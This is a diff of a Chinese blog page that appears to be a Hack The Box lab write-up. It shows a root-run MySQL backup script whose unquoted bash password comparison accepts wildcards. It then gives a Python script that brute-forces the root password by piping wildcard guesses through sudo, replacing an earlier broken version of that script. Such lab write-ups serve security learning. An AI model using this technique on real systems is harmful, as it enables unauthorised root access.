@@ -102,12 +102,12 @@ look-hui = c0iq = lookhui</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://www.loliapi.com/acg/?761726"></li>
-          <li class="item" data-background-image="https://www.loliapi.com/acg/?757198"></li>
-          <li class="item" data-background-image="https://www.loliapi.com/acg/?798079"></li>
-          <li class="item" data-background-image="https://www.loliapi.com/acg/?502373"></li>
-          <li class="item" data-background-image="https://www.loliapi.com/acg/?538149"></li>
-          <li class="item" data-background-image="https://www.loliapi.com/acg/?805532"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?710698"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?602624"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?837638"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?304551"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?858973"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?654674"></li>
         </ul>
       </div>
     </header>
@@ -184,7 +184,7 @@ look-hui = c0iq = lookhui</title>
 <p><span class="exturl" data-url="aHR0cDovL3huLS1teXNxbC1iYWNrdXAtdnoweG40NWEuc2g=">打开 mysql-backup.sh</span></p>
 <p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">DB_USER=&quot;root&quot;</span><br><span class="line">DB_PASS=$(/usr/bin/cat /root/.creds)</span><br><span class="line">BACKUP_DIR=&quot;/var/backups/mysql&quot;</span><br><span class="line"></span><br><span class="line">read -s -p &quot;Enter MySQL password for $DB_USER: &quot; USER_PASS</span><br><span class="line">/usr/bin/echo</span><br><span class="line"></span><br><span class="line">if [[ $DB_PASS == $USER_PASS ]]; then</span><br><span class="line">        /usr/bin/echo &quot;Password confirmed!&quot;</span><br><span class="line">else</span><br><span class="line">        /usr/bin/echo &quot;Password confirmation failed!&quot;</span><br><span class="line">        exit 1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">/usr/bin/mkdir -p &quot;$BACKUP_DIR&quot;</span><br><span class="line"></span><br><span class="line">databases=$(/usr/bin/mysql -u &quot;$DB_USER&quot; -h 0.0.0.0 -P 3306 -p&quot;$DB_PASS&quot; -e &quot;SHOW DATABASES;&quot; | /usr/bin/grep -Ev &quot;(Database|information_schema|performance_schema)&quot;)</span><br><span class="line"></span><br><span class="line">for db in $databases; do</span><br><span class="line">    /usr/bin/echo &quot;Backing up database: $db&quot;</span><br><span class="line">    /usr/bin/mysqldump --force -u &quot;$DB_USER&quot; -h 0.0.0.0 -P 3306 -p&quot;$DB_PASS&quot; &quot;$db&quot; | /usr/bin/gzip &gt; &quot;$BACKUP_DIR/$db.sql.gz&quot;</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">/usr/bin/echo &quot;All databases backed up successfully!&quot;</span><br><span class="line">/usr/bin/echo &quot;Changing the permissions&quot;</span><br><span class="line">/usr/bin/chown root:sys-adm &quot;$BACKUP_DIR&quot;</span><br><span class="line">/usr/bin/chmod 774 -R &quot;$BACKUP_DIR&quot;</span><br><span class="line">/usr/bin/echo &#x27;Done!&#x27;</span><br></pre></td></tr></table></figure></p>
 <p>这里的话使用脚本</p>
-<p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import string</span><br><span class="line">import subproccess</span><br><span class="line"></span><br><span class="line">def check_password(p):</span><br><span class="line">	command = f&quot;echo &#x27;&#123;p&#125;*&#x27; | sudo /opt/scripts/mysql-backup.sh&quot;</span><br><span class="line">	result = subprocess.run(command, shell=True, stdout=subproccess.PIPE, stderr=subproccess.PIPE, text=True)</span><br><span class="line">	return &quot;Password confirmed!&quot; in result.stdout</span><br><span class="line"></span><br><span class="line">charset = string.ascii_letters + string.digits</span><br><span class="line">password = &quot;&quot;</span><br><span class="line">is_password_found = False</span><br><span class="line"></span><br><span class="line">while not is_password_found:</span><br><span class="line">	for char in charset:</span><br><span class="line">		if check_password(password + char)</span><br><span class="line">			password += char</span><br><span class="line">			print(password)</span><br><span class="line">			break</span><br><span class="line">	else:</span><br><span class="line">		is_password_found = True</span><br></pre></td></tr></table></figure></p>
+<p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line">import string</span><br><span class="line">def run_command(command):</span><br><span class="line">    output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.decode()</span><br><span class="line">    return output</span><br><span class="line"></span><br><span class="line">dic=string.ascii_letters+string.digits</span><br><span class="line">password=&quot;&quot;</span><br><span class="line">for i in range(100):</span><br><span class="line">    for i in dic:</span><br><span class="line">        output= run_command(f&#x27;echo &quot;&#123;password&#125;&#123;i&#125;*&quot; | sudo /opt/scripts/mysql-backup.sh&#x27;)</span><br><span class="line">        if &quot;Password confirmed&quot; in output:</span><br><span class="line">            password+=i</span><br><span class="line">            print(password)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure></p>
 <p>得到 root 密码</p>
 <p>得到密码后不要使用 ssh 连接直接使用 su root 即可</p>
 
@@ -201,7 +201,7 @@ look-hui = c0iq = lookhui</title>
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">更新于</span>
-    <time title="修改时间：2023-12-14 15:58:37" itemprop="dateModified" datetime="2023-12-14T15:58:37+08:00">2023-12-14</time>
+    <time title="修改时间：2023-12-14 16:02:42" itemprop="dateModified" datetime="2023-12-14T16:02:42+08:00">2023-12-14</time>
   </span>
 </div>
 
@@ -251,7 +251,7 @@ look-hui = c0iq = lookhui</title>
     <div class="item left">
       
 
-  <a href="/c0iq/HTB-Analytics/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?962004" title="HTB-Analytics">
+  <a href="/c0iq/HTB-Analytics/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?291451" title="HTB-Analytics">
   <span class="type">上一篇</span>
   <span class="category"><i class="ic i-flag"></i> HTB</span>
   <h3>HTB-Analytics</h3>
@@ -372,20 +372,10 @@ look-hui = c0iq = lookhui</title>
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/c0iq/categories/HTB/" title="分类于 HTB">HTB</a>
+<a href="/c0iq/categories/WEB/" title="分类于 WEB">WEB</a>
 </div>
 
-    <span><a href="/c0iq/HTB-hunting-md/" title="HTB-hunting">HTB-hunting</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/c0iq/categories/HTB/" title="分类于 HTB">HTB</a>
-</div>
-
-    <span><a href="/c0iq/HTB-WEB-md/" title="HTB-WEB">HTB-WEB</a></span>
+    <span><a href="/c0iq/WEB%E5%88%B7%E9%A2%98-md/" title="WEB刷题解析">WEB刷题解析</a></span>
   </li>
 
       
@@ -405,6 +395,36 @@ look-hui = c0iq = lookhui</title>
 <a href="/c0iq/categories/HTB/" title="分类于 HTB">HTB</a>
 </div>
 
+    <span><a href="/c0iq/HTB-CozyHosting/" title="HTB-CozyHosting">HTB-CozyHosting</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/c0iq/categories/HTB/" title="分类于 HTB">HTB</a>
+</div>
+
+    <span><a href="/c0iq/HTB-You-know-0xDiablos-md/" title="HTB-You_know_0xDiablos">HTB-You_know_0xDiablos</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/c0iq/categories/%E6%AF%94%E8%B5%9B/" title="分类于 比赛">比赛</a>
+</div>
+
+    <span><a href="/c0iq/%E5%8F%A4%E5%89%91%E5%B1%B1wp-md/" title="第一届古剑山">第一届古剑山</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/c0iq/categories/HTB/" title="分类于 HTB">HTB</a>
+</div>
+
     <span><a href="/c0iq/HTB-Codify/" title="HTB-Codify">HTB-Codify</a></span>
   </li>
 
@@ -415,7 +435,7 @@ look-hui = c0iq = lookhui</title>
 <a href="/c0iq/categories/HTB/" title="分类于 HTB">HTB</a>
 </div>
 
-    <span><a href="/c0iq/HTB-Sau/" title="HTB-Sau">HTB-Sau</a></span>
+    <span><a href="/c0iq/HTB-Sick-ROP/" title="HTB-Sick_ROP">HTB-Sick_ROP</a></span>
   </li>
 
       
@@ -435,17 +455,7 @@ look-hui = c0iq = lookhui</title>
 <a href="/c0iq/categories/HTB/" title="分类于 HTB">HTB</a>
 </div>
 
-    <span><a href="/c0iq/HTB-You-know-0xDiablos-md/" title="HTB-You_know_0xDiablos">HTB-You_know_0xDiablos</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/c0iq/categories/WEB/" title="分类于 WEB">WEB</a>
-</div>
-
-    <span><a href="/c0iq/WEB%E5%88%B7%E9%A2%98-md/" title="WEB刷题解析">WEB刷题解析</a></span>
+    <span><a href="/c0iq/HTB-WEB-md/" title="HTB-WEB">HTB-WEB</a></span>
   </li>
 
       
@@ -455,17 +465,7 @@ look-hui = c0iq = lookhui</title>
 <a href="/c0iq/categories/HTB/" title="分类于 HTB">HTB</a>
 </div>
 
-    <span><a href="/c0iq/HTB-racecar-md/" title="HTB-racecar">HTB-racecar</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/c0iq/categories/PWN/" title="分类于 PWN">PWN</a>
-</div>
-
-    <span><a href="/c0iq/PWN%E5%88%B7%E9%A2%98-md/" title="PWN刷题解析">PWN刷题解析</a></span>
+    <span><a href="/c0iq/HTB-hunting-md/" title="HTB-hunting">HTB-hunting</a></span>
   </li>
 
   </ul>
